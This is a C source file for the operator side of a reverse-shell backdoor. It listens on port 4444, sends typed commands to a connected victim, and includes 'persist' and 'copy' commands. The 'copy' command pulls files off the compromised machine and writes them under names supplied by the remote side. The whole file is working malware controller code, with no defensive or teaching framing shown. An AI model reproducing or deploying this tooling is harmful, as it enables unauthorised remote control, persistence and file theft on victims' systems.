#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <stdint.h>

#define BUFFER_SIZE 8192

void receive_file(int client_socket) {
    uint32_t nameLen;
    uint64_t filesize;
    char filename[1024];
    char buffer[BUFFER_SIZE];
    FILE *file;
    uint64_t total = 0;
    int bytes_received;
    
    if (recv(client_socket, &nameLen, sizeof(nameLen), 0) <= 0) return;
    if (nameLen >= 1024) return;
    
    memset(filename, 0, sizeof(filename));
    if (recv(client_socket, filename, nameLen, 0) <= 0) return;
    
    if (recv(client_socket, &filesize, sizeof(filesize), 0) <= 0) return;
    
    printf("receiving the file: %s (%llu bytes)\n", filename, (unsigned long long)filesize);
    
    file = fopen(filename, "wb");
    if (file == NULL) {
        printf("Erro to create file %s\n", filename);
        return;
    }
    
    while (total < filesize) {
        int want = BUFFER_SIZE;
        if (filesize - total < BUFFER_SIZE)
            want = (int)(filesize - total);
        
        bytes_received = recv(client_socket, buffer, want, 0);
        if (bytes_received <= 0) break;
        
        fwrite(buffer, 1, bytes_received, file);
        total += bytes_received;
    }
    
    fclose(file);
    
    if (total == filesize) {
        printf("file %s received! (%llu bytes)\n", filename, (unsigned long long)total);
    } else {
        printf("Erro: incomplete file (%llu/%llu bytes)\n", (unsigned long long)total, (unsigned long long)filesize);
    }
}

int main()
{
	int sock, client_socket;
	char buffer[1024];
	char response[18384];
	struct sockaddr_in server_address, client_address;
	int optval = 1;
	socklen_t client_length;

	sock = socket(AF_INET, SOCK_STREAM, 0);

	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
		printf("Error Setting TCP Socket Options!\n");
		return 1;
	}

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = inet_addr("192.168.1.8");
	server_address.sin_port = htons(4444);

	bind(sock, (struct sockaddr *) &server_address, sizeof(server_address));
	listen(sock, 5);
	client_length = sizeof(client_address);
	client_socket = accept(sock, (struct sockaddr *) &client_address, &client_length);

	while(1)
	{
		bzero(&buffer, sizeof(buffer));
		bzero(&response, sizeof(response));
		printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
		fgets(buffer, sizeof(buffer), stdin);
		strtok(buffer, "\n");
		send(client_socket, buffer, strlen(buffer), 0);
		
		if (strncmp("q", buffer, 1) == 0) {
			break;
		}
		else if (strncmp("cd ", buffer, 3) == 0) {
			recv(client_socket, response, sizeof(response), 0);
		}
		else if (strncmp("persist", buffer, 7) == 0) {
			recv(client_socket, response, sizeof(response), 0);
			printf("%s", response);
		}
		else if (strncmp("copy ", buffer, 5) == 0) {
			receive_file(client_socket);
			recv(client_socket, response, sizeof(response), 0);
			printf("%s", response);
		}
		else {
			recv(client_socket, response, sizeof(response), 0);
			printf("%s", response);
		}
	}
}
